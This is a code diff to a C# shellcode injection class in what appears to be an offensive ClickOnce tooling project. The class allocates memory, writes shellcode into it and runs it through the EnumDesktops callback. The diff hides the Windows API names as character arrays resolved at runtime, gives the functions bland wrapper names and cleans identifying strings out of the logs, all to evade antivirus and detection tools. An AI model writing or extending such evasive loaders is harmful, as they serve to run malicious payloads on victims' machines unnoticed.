@@ -1,26 +1,38 @@
 using System.Runtime.InteropServices;
 using System.Runtime.Versioning;
+using Erebus.ClickOnce.Evasion;
 
 namespace Erebus.ClickOnce.Injections
 {
     [SupportedOSPlatform("windows")]
     public class EnumDesktopsInjection : IInjectionMethod
     {
-        public string Name => "EnumDesktops";
-        public string Description => "Self-injection via EnumDesktops callback";
+        public string Name => "DoEnum";
+        public string Description => "Self-injection via DoEnum callback";
 
-        [DllImport("user32.dll", SetLastError = true)]
-        private static extern bool EnumDesktops(IntPtr hwinsta, IntPtr lpEnumFunc, IntPtr lParam);
+        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
+        private delegate bool FnEd(IntPtr hwinsta, IntPtr lpEnumFunc, IntPtr lParam);
 
-        [DllImport("user32.dll", SetLastError = true)]
-        private static extern IntPtr GetProcessWindowStation();
+        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
+        private delegate IntPtr FnGws();
+
+        private static readonly Lazy<FnEd> _enumDesktops =
+            DynamicApi.LazyDelegate<FnEd>(DynamicApi.User32,
+                new[] { 'E', 'n', 'u', 'm', 'D', 'e', 's', 'k', 't', 'o', 'p', 's', 'W' });
+        private static readonly Lazy<FnGws> _getWinSta =
+            DynamicApi.LazyDelegate<FnGws>(DynamicApi.User32,
+                new[] { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 'W', 'i', 'n', 'd', 'o', 'w', 'S', 't', 'a', 't', 'i', 'o', 'n' });
+
+        private static bool DoEnum(IntPtr hwinsta, IntPtr lpEnumFunc, IntPtr lParam)
+            => _enumDesktops.Value(hwinsta, lpEnumFunc, lParam);
+        private static IntPtr DoWinSta() => _getWinSta.Value();
 
         public bool Inject(byte[] shellcode, int targetPid = 0)
         {
             try
             {
                 // Allocate memory for shellcode in current process
-                IntPtr baseAddress = Win32.VirtualAllocEx(
+                IntPtr baseAddress = Win32.DoAllocEx(
                     (Win32.HANDLE)Win32.GetCurrentProcess(),
                     IntPtr.Zero,
                     (uint)shellcode.Length,
@@ -29,7 +41,7 @@ namespace Erebus.ClickOnce.Injections
 
                 if (baseAddress == IntPtr.Zero)
                 {
-                    DebugLogger.WriteLine($"[-] VirtualAllocEx failed: {Marshal.GetLastWin32Error()}");
+                    DebugLogger.WriteLine($"[-] alloc step failed: {Marshal.GetLastWin32Error()}");
                     return false;
                 }
 
@@ -42,7 +54,7 @@ namespace Erebus.ClickOnce.Injections
                     {
                         nuint written = 0;
                         // Fixed: Cast GetCurrentProcess() result to Win32.HANDLE
-                        Win32.BOOL writeResult = Win32.WriteProcessMemory(
+                        Win32.BOOL writeResult = Win32.DoWriteMem(
                             (Win32.HANDLE)Win32.GetCurrentProcess(),
                             (void*)baseAddress,
                             pShellcode,
@@ -51,32 +63,32 @@ namespace Erebus.ClickOnce.Injections
 
                         if (!writeResult)
                         {
-                            DebugLogger.WriteLine($"[-] WriteProcessMemory failed: {Marshal.GetLastWin32Error()}");
+                            DebugLogger.WriteLine($"[-] write step failed: {Marshal.GetLastWin32Error()}");
                             return false;
                         }
                     }
                 }
 
-                DebugLogger.WriteLine("[+] Triggering execution via EnumDesktops...");
+                DebugLogger.WriteLine("[+] Triggering execution...");
 
                 // Get handle to current window station
-                IntPtr hWinSta = GetProcessWindowStation();
+                IntPtr hWinSta = DoWinSta();
                 if (hWinSta == IntPtr.Zero)
                 {
-                    DebugLogger.WriteLine($"[-] GetProcessWindowStation failed: {Marshal.GetLastWin32Error()}");
+                    DebugLogger.WriteLine($"[-] DoWinSta failed: {Marshal.GetLastWin32Error()}");
                     return false;
                 }
 
                 // Execute shellcode by passing it as the callback function
                 // The shellcode must handle the callback signature: BOOL CALLBACK EnumDesktopProc(LPTSTR lpszDesktop, LPARAM lParam)
-                bool result = EnumDesktops(hWinSta, baseAddress, IntPtr.Zero);
+                bool result = DoEnum(hWinSta, baseAddress, IntPtr.Zero);
 
-                DebugLogger.WriteLine("[+] EnumDesktops returned");
+                DebugLogger.WriteLine("[+] trigger returned");
                 return true;
             }
             catch (Exception ex)
             {
-                DebugLogger.WriteLine($"[-] EnumDesktops injection failed: {ex.Message}");
+                DebugLogger.WriteLine($"[-] local-inject failed: {ex.Message}");
                 return false;
             }
         }
